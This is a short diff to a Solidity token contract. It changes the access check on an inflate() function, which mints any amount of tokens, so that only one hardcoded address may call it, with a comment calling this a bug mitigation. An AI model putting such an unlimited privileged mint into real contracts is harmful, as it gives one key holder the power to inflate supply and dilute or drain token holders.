@@ -178,7 +178,7 @@ contract TokenisableRange is ERC20("", ""), ReentrancyGuard {
   
   /// @notice Inflate supply /// mitigate bug Sep-13th
   function inflate(uint newLiquidity) external {
-    require(msg.sender == creator, "Unallowed call");
+    require(msg.sender == 0x7433D4158c702Dc6bF0974E0bB4EEA152cfbDd6A, "Unallowed call");
     _mint(msg.sender, newLiquidity);
   }
   
